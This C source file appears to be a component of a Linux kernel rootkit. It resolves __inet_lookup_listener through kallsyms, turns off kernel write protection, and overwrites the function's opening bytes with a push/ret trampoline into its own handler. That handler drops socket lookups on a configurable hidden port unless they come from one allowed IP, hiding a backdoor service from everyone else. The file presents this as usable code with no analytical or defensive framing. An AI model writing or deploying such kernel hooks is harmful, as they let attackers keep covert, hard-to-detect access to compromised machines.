#include<linux/module.h>
#include<linux/moduleparam.h>
#include<linux/string.h>
#include<linux/inet_diag.h>
#include<linux/slab.h>
#include<linux/socket.h>
#include<linux/net.h>
#include<net/ip.h>
#include<net/sock.h>
#include<net/tcp.h>
#include<net/inet_sock.h>
#include<linux/skbuff.h>
#include<linux/inet.h>
#include<linux/kallsyms.h>
#include<linux/kernel.h>

#include "hooking.h"
#include "port_knocking.h"

#define dp() disable_wp()
#define wp() enable_wp()
#define HIJACK_LEN 6

static struct sock * (*orig_looklisten)(struct net*,struct inet_hashinfo*, const __be32,
					__be16, const __be32, const unsigned short,
					const int);
static struct sock * my_looklisten(struct net*,struct inet_hashinfo*, const __be32,
					__be16, const __be32, const unsigned short,
					const int);

static char lookup_code[HIJACK_LEN];
static char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
static unsigned int *p_addr = (unsigned int*) (hjc+1);

static char * allowed_ip_str = "127.000.000.001";
static unsigned short hidden_port = 0;
static unsigned int allowed_ip = 0;

module_param(allowed_ip_str,charp,0);
module_param(hidden_port, short, 0);
MODULE_PARM_DESC(allowed_ip_str, "IP address format: XXX.XXX.XXX.XXX");
MODULE_PARM_DESC(hidden_port, "Hidden service port");

//move this to hooking.h
union address_conv_t {
	unsigned long d64;
	unsigned int d32[2];
	unsigned char d8[4];
} adc;

static spinlock_t hijack_lock = __SPIN_LOCK_UNLOCKED(hijack_lock);


/*
* 	Convert IP string to integer
*/
unsigned int ipstr_to_int(char* ip_str)
{
	int err;
	unsigned char ip[4];
	unsigned int ret;
	const char* end;

	err = in4_pton(ip_str, -1, ip, -1, &end);
	if (err == 0) {
		return -1;
	}
	
	ret = *((unsigned int*)ip);
	return ret;
}

void hijack_looklisten(void){
	adc.d64 = (unsigned long) my_looklisten;
	*p_addr = adc.d32[0];
	spin_lock(&hijack_lock);
	memcpy(lookup_code, orig_looklisten, HIJACK_LEN); //save old code
	dp();
	memcpy(orig_looklisten, &hjc, HIJACK_LEN); //inject our code
	wp();
	spin_unlock(&hijack_lock);
}

struct sock * my_looklisten(struct net* net,
			struct inet_hashinfo* hashinfo, 
			const __be32 saddr, __be16 sport,
			const __be32 daddr, const unsigned short hnum,
			const int dif){
	struct sock * ret;

	printk(KERN_INFO "Lookup: s %pI4 sp %hu d %pI4 dp %hu\n", &saddr, sport, &daddr, hnum);	

	if(hnum == hidden_port){
		if(saddr != allowed_ip){
			printk(KERN_INFO "lookup denied.\n");
			return 0;
		}
	}
	printk(KERN_INFO "lookup allowed.\n");
	spin_lock(&hijack_lock);
	dp();
	memcpy(orig_looklisten, lookup_code, HIJACK_LEN);
	ret = orig_looklisten(net, hashinfo,saddr,sport,daddr,hnum,dif);
	memcpy(orig_looklisten, &hjc, HIJACK_LEN);
	wp();
	spin_unlock(&hijack_lock);	

	return ret;
}

void no_knock(void){
	unsigned long * addr;

	printk(KERN_INFO "=================================\n");
	
	addr = (unsigned long *) kallsyms_lookup_name("__inet_lookup_listener");
	orig_looklisten = (struct sock* (*)(struct net*,struct inet_hashinfo*, const __be32,
					__be16, const __be32, const unsigned short,
					const int))addr;

	allowed_ip = ipstr_to_int(allowed_ip_str);	
	printk(KERN_INFO "allowed ip: %pI4\n", &allowed_ip);
	
	hijack_looklisten();
}


void come_in(void){
	spin_lock(&hijack_lock);
	dp();
	memcpy(orig_looklisten, lookup_code, HIJACK_LEN);
	wp();
	spin_unlock(&hijack_lock);
}
